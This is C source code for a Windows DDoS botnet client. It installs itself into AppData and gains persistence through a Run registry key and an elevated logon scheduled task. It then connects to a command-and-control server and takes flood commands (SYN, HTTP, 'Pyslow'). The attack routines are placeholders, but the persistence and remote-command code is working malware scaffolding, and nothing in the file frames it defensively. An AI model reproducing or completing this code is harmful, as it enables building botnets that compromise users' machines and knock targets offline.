#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1" // Replace with actual server IP
#define SERVER_PORT 65432
#define BUFFER_SIZE 1024

void install_to_appdata() {
    char appdata_path[MAX_PATH];
    char dest_path[MAX_PATH];
    char *filename = "client.exe"; // Replace with actual executable name

    // Get path to AppData
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata_path))) {
        snprintf(dest_path, MAX_PATH, "%s\\%s", appdata_path, filename);

        // Copy the executable to AppData
        if (CopyFile(filename, dest_path, FALSE)) {
            printf("Client copied to %s\n", dest_path);
        } else {
            printf("Failed to copy client to AppData.\n");
            return;
        }
    } else {
        printf("Failed to get AppData path.\n");
        return;
    }

    // Add Registry key for Startup
    HKEY hKey;
    const char *reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyEx(HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "ClientStartup", 0, REG_SZ, (BYTE *)dest_path, strlen(dest_path) + 1);
        RegCloseKey(hKey);
        printf("Registry startup key created.\n");
    } else {
        printf("Failed to create registry startup key.\n");
    }

    // Create a Scheduled Task to run as Administrator
    char cmd[MAX_PATH];
    snprintf(cmd, MAX_PATH,
             "schtasks /create /tn \"ClientAdmin\" /tr \"%s\" /sc onlogon /rl highest", dest_path);
    system(cmd);
    printf("Scheduled task created for elevated startup.\n");
}

void execute_command(const char *command) {
    if (strcmp(command, "start_syn") == 0) {
        printf("Executing SYN flood attack...\n");
        // Placeholder for SYN flood attack logic
    } else if (strcmp(command, "start_http") == 0) {
        printf("Executing HTTP request flood attack...\n");
        // Placeholder for HTTP flood attack logic
    } else if (strcmp(command, "start_pyslow") == 0) {
        printf("Executing Pyslow attack...\n");
        // Placeholder for Pyslow attack logic
    } else if (strcmp(command, "stop") == 0) {
        printf("Stopping all attacks...\n");
        // Placeholder for stopping any ongoing attacks
    } else {
        printf("Unknown command received: %s\n", command);
    }
}

void communicate_with_server() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    char buffer[BUFFER_SIZE];
    int bytes_received;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return;
    }

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("Could not create socket.\n");
        WSACleanup();
        return;
    }

    // Define server address
    server.sin_family = AF_INET;
    server.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &server.sin_addr);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        printf("Connection to server failed.\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    printf("Connected to server.\n");

    while (1) {
        // Receive command from server
        bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
        if (bytes_received <= 0) {
            printf("Connection lost.\n");
            break;
        }
        buffer[bytes_received] = '\0';

        printf("Command received: %s\n", buffer);
        execute_command(buffer);

        // Send acknowledgment back to server
        send(sock, "ACK", strlen("ACK"), 0);
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();
}

int main() {
    // Install the client to AppData and set up startup
    install_to_appdata();

    // Start communication with the server
    communicate_with_server();

    return 0;
}
